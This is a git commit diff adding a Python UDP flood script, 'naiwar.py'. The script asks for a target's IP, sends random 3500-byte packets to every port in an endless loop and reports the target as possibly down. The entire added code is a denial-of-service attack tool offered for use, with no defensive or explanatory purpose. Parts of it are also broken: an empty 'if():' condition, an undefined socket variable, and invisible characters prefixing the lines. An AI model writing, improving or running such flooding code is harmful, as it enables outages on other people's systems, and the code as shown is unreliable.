86b405f3561b91f52d0e373dd124cf279729e72b
kunkaffa <kunkaffa3@gmail.com>
2025-09-11 06:30:27 +0700

    Update naiwar.py

--- naiwar.py
+++ naiwar.py
@@ -5,3 +5,28 @@
 ‎import time
 ‎import fade
 ‎
+########################
+‎white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+‎bytes = random._urandom(3500)
+‎####################
+‎
+‎os.system("clear")
+‎logo = """
+
+‎"""
+‎faded_text = fade.fire(logo)
+‎print(faded_text)
+‎ip = input("[+] Target's IP : ")
+‎time.sleep(5),
+
+‎while True:
+‎    sent = 0
+‎    for port in range(1, 65534):
+‎        white.sendto(bytes, (ip, port))
+‎        sent = sent + 1
+‎        time.sleep(1)
+‎        print("\033[94m[NAIwar] \033[97m%s  \033[31m[send to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+‎    if():
+‎        s.close
+‎        print("\033[31m.......Maybe down.......\033[0m")
+‎
